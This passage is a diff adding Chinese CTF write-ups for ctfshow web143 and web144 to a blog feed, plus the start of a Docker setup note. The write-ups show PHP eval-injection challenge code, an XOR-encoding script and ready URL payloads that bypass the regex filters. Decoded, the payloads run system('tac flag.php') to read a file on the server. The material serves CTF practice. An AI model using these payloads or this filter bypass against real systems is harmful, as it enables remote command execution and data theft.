punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v1&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v3&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v2&lt;/span&gt;&lt;/span&gt; = &#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;check&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;v1 必须是数字，v3 只能是一个字符，v2 是除了数字、字母、下划线以外的字符，那就只能在 v2 中执行&lt;/p&gt;
+&lt;h3 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; payload&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;/?v1=1&amp;amp;v3=1&amp;amp;v2=*(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff)
+&lt;/code&gt;&lt;/pre&gt;
+</content>
+        <category term="ctfshow" scheme="http://m3k0mi.github.io/categories/ctfshow/" />
+        <category term="web144" scheme="http://m3k0mi.github.io/categories/ctfshow/web144/" />
+        <category term="ctfshow" scheme="http://m3k0mi.github.io/tags/ctfshow/" />
+        <updated>2024-05-27T07:21:46.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://m3k0mi.github.io/2024/05/27/eval%E4%B8%AD%E7%9A%84return-web143/</id>
+        <title>eval中的return-web143</title>
+        <link rel="alternate" href="http://m3k0mi.github.io/2024/05/27/eval%E4%B8%AD%E7%9A%84return-web143/"/>
+        <content type="html">&lt;h3 id=&#34;代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码&#34;&gt;#&lt;/a&gt; 代码&lt;/h3&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;/*&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# -*- coding: utf-8 -*-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Author: h1xa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Date:   2020-10-13 11:25:09&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Last Modified by:   h1xa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Last Modified time: 2020-10-18 12:48:14&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;*/&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v3&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$v1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-casting&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$v2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-casting&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$v3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-casting&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v3&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$v1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$v2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&amp;#123;|\&amp;#125;|\~|\%|\&amp;amp;|\;/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$v3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;get out hacker!&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;token keyword&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;return &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v1&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v3&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v2&lt;/span&gt;&lt;/span&gt;;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v1&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v3&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v2&lt;/span&gt;&lt;/span&gt; = &#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;v1 和 v2 都得是数字，只能在 v3 上写 payload，但是有 return 干扰，可以添加 + - * 等字符。&lt;/p&gt;
+&lt;h3 id=&#34;异或脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#异或脚本&#34;&gt;#&lt;/a&gt; 异或脚本&lt;/h3&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;tac flag.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;%&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;dechex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0xff&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;^&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;%ff&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; payload&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;?v1=1&amp;amp;v2=1&amp;amp;v3=*(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff)*
+&lt;/code&gt;&lt;/pre&gt;
+</content>
+        <category term="ctfshow" scheme="http://m3k0mi.github.io/categories/ctfshow/" />
+        <category term="web143" scheme="http://m3k0mi.github.io/categories/ctfshow/web143/" />
+        <category term="ctfshow" scheme="http://m3k0mi.github.io/tags/ctfshow/" />
+        <updated>2024-05-27T06:54:39.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://m3k0mi.github.io/2024/05/23/docker%E5%90%AF%E5%8A%A8web%E7%8E%AF%E5%A2%83/</id>
+        <title>docker启动web环境</title>
+        <link rel="alternate" href="http://m3k0mi.github.io/2024/05/23/docker%E5%90%AF%E5%8A%A8web%E7%8E%AF%E5%A2%83/"/>
+        <content type="html">&lt;h3 id=&#34;创建镜像&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建镜像&#34;&gt;#&lt;/a&gt; 创建镜像&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;docker&lt;/span&gt; build &lt;span class=&#34;token parameter variable&#34;&gt;-t&lt;/span&gt; name &lt;span class=&#34;token builtin class-name&#34;&gt;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;创建容器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建容器&#34;&gt;#&lt;/a&gt; 创建容器&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;docker&lt;/span&gt; run &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-d&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-P&lt;/span&gt; name&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;进入正在运行容器内&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#进入正在运行容器内&#34;&gt;#&lt;/a&gt; 进入正在运行容器内&lt;/h3&gt;
